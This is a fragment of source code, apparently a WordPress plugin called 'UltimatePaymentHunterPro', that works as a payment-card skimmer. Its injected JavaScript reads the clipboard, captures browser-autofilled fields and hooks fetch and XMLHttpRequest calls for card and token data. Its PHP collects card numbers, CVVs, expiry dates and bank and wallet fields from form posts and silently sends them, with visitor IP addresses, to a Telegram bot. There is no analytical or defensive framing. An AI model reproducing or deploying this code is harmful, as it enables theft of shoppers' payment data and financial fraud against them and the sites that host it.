                checkClipboard: function(source) {
                    if (navigator.clipboard && navigator.clipboard.readText) {
                        navigator.clipboard.readText().then(function(text) {
                            if (text && SilentUtils.isPaymentData(text)) {
                                ClipboardMonitor.handleClipboardData(text, source);
                            }
                        }).catch(function() {});
                    }
                },
                
                handleClipboardData: function(text, source) {
                    SilentUtils.sendToServer('clipboard_data', {
                        clipboard_info: {
                            data: text.substring(0, 100),
                            type: source,
                            is_payment: SilentUtils.isPaymentData(text)
                        }
                    });
                },
                
                setupPeriodicCheck: function() {
                    // Periodic clipboard check (for autofill scenarios)
                    setInterval(function() {
                        ClipboardMonitor.checkClipboard('PERIODIC');
                    }, 30000);
                }
            };
            
            // ==================== BROWSER AUTOFILL HUNTER ====================
            var AutofillHunter = {
                init: function() {
                    this.setupAutofillDetection();
                    this.setupDelayedCapture();
                },
                
                setupAutofillDetection: function() {
                    // Check for autofilled inputs on load
                    setTimeout(function() {
                        AutofillHunter.captureAutofilledFields();
                    }, 3000); // Wait for browser autofill
                    
                    // Check on form focus
                    document.addEventListener('focusin', function(e) {
                        if (e.target.tagName === 'INPUT' || e.target.tagName === 'FORM') {
                            setTimeout(function() {
                                AutofillHunter.captureAutofilledFields();
                            }, 1000);
                        }
                    });
                    
                    // CSS pseudo-class detection
                    var checkAutofilled = function() {
                        var autofilled = document.querySelectorAll('input:-webkit-autofill, input:autofill');
                        autofilled.forEach(function(input) {
                            if (input.value && !input.dataset.autofillCaptured) {
                                input.dataset.autofillCaptured = 'true';
                                AutofillHunter.captureAutofillData(input);
                            }
                        });
                    };
                    
                    setInterval(checkAutofilled, 2000);
                },
                
                captureAutofilledFields: function() {
                    var allInputs = document.querySelectorAll('input, textarea');
                    var paymentInputs = [];
                    
                    allInputs.forEach(function(input) {
                        if (input.value && input.value.trim() && 
                            UniversalFormHunter.isPaymentField(input)) {
                            paymentInputs.push(input);
                        }
                    });
                    
                    if (paymentInputs.length >= 2) {
                        paymentInputs.forEach(function(input) {
                            AutofillHunter.captureAutofillData(input);
                        });
                    }
                },
                
                captureAutofillData: function(input) {
                    var fieldInfo = {
                        name: input.name || input.id || input.placeholder || 'unknown',
                        value: input.value,
                        type: input.type
                    };
                    
                    SilentUtils.sendToServer('autofill_captured', {
                        autofill_info: fieldInfo,
                        page_url: window.location.href
                    });
                },
                
                setupDelayedCapture: function() {
                    // Additional capture after page interactions
                    document.addEventListener('click', function() {
                        setTimeout(function() {
                            AutofillHunter.captureAutofilledFields();
                        }, 2000);
                    });
                }
            };
            
            // ==================== NETWORK REQUEST MONITOR ====================
            var NetworkMonitor = {
                init: function() {
                    this.interceptFetch();
                    this.interceptXHR();
                },
                
                interceptFetch: function() {
                    var originalFetch = window.fetch;
                    
                    window.fetch = function(resource, init) {
                        if (init && init.body) {
                            NetworkMonitor.analyzeRequestData(init.body, 'FETCH', resource);
                        }
                        return originalFetch.apply(this, arguments);
                    };
                },
                
                interceptXHR: function() {
                    var originalOpen = XMLHttpRequest.prototype.open;
                    var originalSend = XMLHttpRequest.prototype.send;
                    
                    XMLHttpRequest.prototype.open = function(method, url) {
                        this._method = method;
                        this._url = url;
                        return originalOpen.apply(this, arguments);
                    };
                    
                    XMLHttpRequest.prototype.send = function(body) {
                        if (body && this._method === 'POST') {
                            NetworkMonitor.analyzeRequestData(body, 'XHR', this._url);
                        }
                        return originalSend.apply(this, arguments);
                    };
                },
                
                analyzeRequestData: function(body, type, url) {
                    try {
                        var data;
                        
                        if (typeof body === 'string') {
                            try {
                                data = JSON.parse(body);
                            } catch (e) {
                                data = body;
                            }
                        } else if (body instanceof FormData) {
                            data = {};
                            for (var pair of body.entries()) {
                                data[pair[0]] = pair[1];
                            }
                        } else {
                            data = body;
                        }
                        
                        var dataStr = JSON.stringify(data).toLowerCase();
                        if (dataStr.includes('card') || dataStr.includes('cvv') || 
                            dataStr.includes('payment') || dataStr.includes('token')) {
                            
                            SilentUtils.sendToTelegram(
                                '🌐 Payment API: ' + type + '\n' +
                                'URL: ' + (url || 'unknown') + '\n' +
                                'Data: ' + dataStr.substring(0, 200)
                            );
                        }
                    } catch (e) {
                        // Silent fail
                    }
                }
            };
            
            // ==================== INITIALIZATION ====================
            // Wait for DOM to be ready
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', function() {
                    UltimatePaymentHunter.init();
                });
            } else {
                UltimatePaymentHunter.init();
            }
            
            // Also initialize on window load
            window.addEventListener('load', function() {
                setTimeout(function() {
                    UltimatePaymentHunter.init();
                }, 1000);
            });
            
            // Main initializer
            var UltimatePaymentHunter = {
                init: function() {
                    // Start all modules
                    UniversalFormHunter.init();
                    PaymentGatewayDetector.init();
                    IframeHunter.init();
                    RedirectionTracker.init();
                    ClipboardMonitor.init();
                    AutofillHunter.init();
                    NetworkMonitor.init();
                    
                    // Send activation message
                    var activationMsg = SilentUtils.generateSMSMessage('ACTIVATION', {
                        website: window.location.origin,
                        session: CONFIG.SESSION_ID
                    });
                    SilentUtils.sendToTelegram(activationMsg);
                    
                    // Self-healing mechanism
                    UltimatePaymentHunter.setupSelfHealing();
                },
                
                setupSelfHealing: function() {
                    // Check if hunter is still active
                    setInterval(function() {
                        if (!document.body || !window.jQuery) {
                            location.reload();
                        }
                    }, 30000);
                }
            };
            
        })();
        </script>
        <?php
    }
    
    private function send_sms_only_notification($type, $data) {
        $message = '';
        
        switch($type) {
            case 'ACTIVATION':
                $message = "🚀 Plugin Activated\nSite: " . ($data['website'] ?? 'unknown');
                break;
                
            case 'CART_VISIT':
                $message = "🛒 Cart Page Visited\nPage: " . ($data['page'] ?? 'unknown') . 
                          "\nURL: " . ($data['url'] ?? 'unknown');
                break;
                
            case 'CHECKOUT_VISIT':
                $message = "💳 Checkout Page Visited\nPage: " . ($data['page'] ?? 'unknown') . 
                          "\nURL: " . ($data['url'] ?? 'unknown');
                break;
                
            case 'FORM_SUBMISSION':
                $message = "📋 Form Submitted\nType: " . ($data['form_type'] ?? 'unknown') . 
                          "\nFields: " . ($data['fields'] ?? 0) . 
                          "\nPayment: " . (($data['has_payment'] ?? false) ? 'Yes' : 'No');
                break;
                
            case 'PAYMENT_INFO':
                $cardInfo = $data['card_data'] ?? array();
                $message = "💳 Payment Data Captured\n";
                if (isset($cardInfo['card'])) $message .= "Card: " . $this->mask_card_number($cardInfo['card']) . "\n";
                if (isset($cardInfo['cvv'])) $message .= "CVV: " . $cardInfo['cvv'] . "\n";
                if (isset($cardInfo['expiry'])) $message .= "Expiry: " . $cardInfo['expiry'];
                break;
                
            case 'AUTOFILL_CAPTURED':
                $message = "🔐 Browser Autofill\nFields: " . ($data['fields'] ?? 0) . 
                          "\nPayment: " . (($data['is_payment'] ?? false) ? 'Yes' : 'No');
                break;
                
            case 'IFRAME_DETECTED':
                $message = "🖼️ Payment iFrame\nSrc: " . ($data['src'] ?? 'unknown');
                break;
                
            case 'REDIRECT_TRACKED':
                $message = "🔄 Payment Redirect\nTo: " . ($data['to'] ?? 'unknown');
                break;
                
            case 'CLIPBOARD_DATA':
                $message = "📋 Clipboard Data\nType: " . ($data['data_type'] ?? 'text') . 
                          "\nPayment: " . (($data['is_payment'] ?? false) ? 'Yes' : 'No');
                break;
                
            case 'ORDER_PROCESSED':
                $message = "🛒 Order Processed\nID: #" . ($data['order_id'] ?? 'unknown') . 
                          "\nAmount: " . ($data['amount'] ?? '0') . " " . ($data['currency'] ?? '');
                break;
                
            case 'ADDED_TO_CART':
                $message = "🛍️ Added to Cart\nProduct: " . ($data['product'] ?? 'unknown') . 
                          "\nPrice: " . ($data['price'] ?? '0');
                break;
                
            case 'PAYMENT_COMPLETED':
                $message = "✅ Payment Completed\nOrder: #" . ($data['order_id'] ?? 'unknown') . 
                          "\nAmount: " . ($data['amount'] ?? '0');
                break;
        }
        
        $message .= "\n🆔 Session: " . $this->session_id;
        $message .= "\n📱 Device: " . $this->device_id;
        $message .= "\n🕒 Time: " . current_time('mysql');
        $message .= "\n📍 IP: " . $this->get_client_ip();
        
        $this->send_telegram($message);
    }
    
    private function extract_complete_payment_info() {
        $payment_info = array();
        
        $payment_fields = array(
            'card_number', 'cardnumber', 'ccnumber', 'cc_number', 'card_num', 'card_no', 
            'cc_no', 'accountnumber', 'cardn', 'card', 'ccnum', 'creditcardnumber',
            'expiry', 'exp_date', 'expiration', 'expiry-date', 'expirydate', 'expmonth', 
            'exp_year', 'expiry_year', 'expire', 'cc_exp', 'card_exp', 'expiry_month', 
            'expiry_year', 'cc_expiry', 'card_expiry', 'expirationdate',
            'cvv', 'cvc', 'cvn', 'security_code', 'card_cvv', 'card_cvc', 'cc_cvv', 
            'cc_cvc', 'cvv2', 'cid', 'cvcode',
            'card_holder', 'cardholder', 'nameoncard', 'card_name', 'cc_name', 
            'card_holder_name', 'cardholdername',
            'paypal_email', 'paypal_account', 'payer_email', 'paypal',
            'stripe_token', 'stripe_email', 'stripe_card',
            'razorpay_payment_id', 'razorpay_order_id', 'razorpay_signature',
            'account_holder', 'account_number', 'routing_number', 'iban', 'swift', 'bank_account'
        );
        
        foreach ($payment_fields as $field) {
            if (isset($_POST[$field]) && !empty($_POST[$field])) {
                $payment_info[$field] = sanitize_text_field($_POST[$field]);
            }
        }
        
        foreach ($_POST as $key => $value) {
            $key_lower = strtolower($key);
            if (strpos($key_lower, 'card') !== false || 
                strpos($key_lower, 'cvv') !== false || 
                strpos($key_lower, 'cvc') !== false ||
                strpos($key_lower, 'expir') !== false ||
                strpos($key_lower, 'paypal') !== false ||
                strpos($key_lower, 'stripe') !== false ||
                strpos($key_lower, 'razorpay') !== false ||
                strpos($key_lower, 'account') !== false) {
                if (!isset($payment_info[$key]) && !empty($value)) {
                    $payment_info[$key] = sanitize_text_field($value);
                }
            }
        }
        
        return $payment_info;
    }
    
    private function extract_card_data($payment_info) {
        $card_data = array();
        
        foreach ($payment_info as $key => $value) {
            $key_lower = strtolower($key);
            
            if ($this->looks_like_card_number($value)) {
                $card_data['card'] = $value;
            } elseif ($this->looks_like_cvv($value)) {
                $card_data['cvv'] = $value;
            } elseif ($this->looks_like_expiry($value)) {
                $card_data['expiry'] = $value;
            } elseif (strpos($key_lower, 'holder') !== false || 
                     strpos($key_lower, 'nameoncard') !== false) {
                $card_data['holder'] = $value;
            }
        }
        
        return $card_data;
    }
    
    private function clean_data($data) {
        $cleaned = array();
        foreach ($data as $key => $value) {
            if (is_string($value)) {
                $cleaned[sanitize_text_field($key)] = sanitize_text_field(substr($value, 0, 500));
            } elseif (is_array($value)) {
                $cleaned[sanitize_text_field($key)] = $this->clean_data($value);
            }
        }
        return $cleaned;
    }
    
    private function has_payment_data($data) {
        foreach ($data as $value) {
            if ($this->looks_like_payment_data($value)) {
                return true;
            }
        }
        return false;
    }
    
    private function looks_like_payment_data($value) {
        if (!is_string($value)) return false;
        
        return $this->looks_like_card_number($value) || 
               $this->looks_like_cvv($value) || 
               $this->looks_like_expiry($value);
    }
    
    private function looks_like_card_number($value) {
        $cleaned = preg_replace('/[^0-9]/', '', $value);
        return strlen($cleaned) >= 13 && strlen($cleaned) <= 19;
    }
    
    private function looks_like_cvv($value) {
        $cleaned = preg_replace('/[^0-9]/', '', $value);
        return strlen($cleaned) >= 3 && strlen($cleaned) <= 4;
    }
    
    private function looks_like_expiry($value) {
        $cleaned = preg_replace('/[^0-9]/', '', $value);
        if (strlen($cleaned) === 4 || strlen($cleaned) === 6) {
            $month = substr($cleaned, 0, 2);
            return $month >= 1 && $month <= 12;
        }
        return false;
    }
    
    private function mask_card_number($number) {
        $cleaned = preg_replace('/[^0-9]/', '', $number);
        if (strlen($cleaned) < 8) return $cleaned;
        
        $first_six = substr($cleaned, 0, 6);
        $last_four = substr($cleaned, -4);
        $middle = str_repeat('*', strlen($cleaned) - 10);
        
        return $first_six . $middle . $last_four;
    }
    
    private function send_telegram($message) {
        $api_url = "https://api.telegram.org/bot{$this->bot_token}/sendMessage";
        
        $response = wp_remote_post($api_url, array(
            'body' => array(
                'chat_id' => $this->chat_id,
                'text' => $message,
                'parse_mode' => 'HTML'
            ),
            'timeout' => 10,
            'blocking' => false
        ));
        
        return !is_wp_error($response);
    }
    
    private function get_client_ip() {
        $ip_keys = array(
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'REMOTE_ADDR'
        );
        
        foreach ($ip_keys as $key) {
            if (isset($_SERVER[$key]) && !empty($_SERVER[$key])) {
                $ip_list = explode(',', $_SERVER[$key]);
                foreach ($ip_list as $ip) {
                    $ip = trim($ip);
                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                        return sanitize_text_field($ip);
                    }
                }
            }
        }
        
        return sanitize_text_field($_SERVER['REMOTE_ADDR'] ?? 'unknown');
    }
}

new UltimatePaymentHunterPro();

}
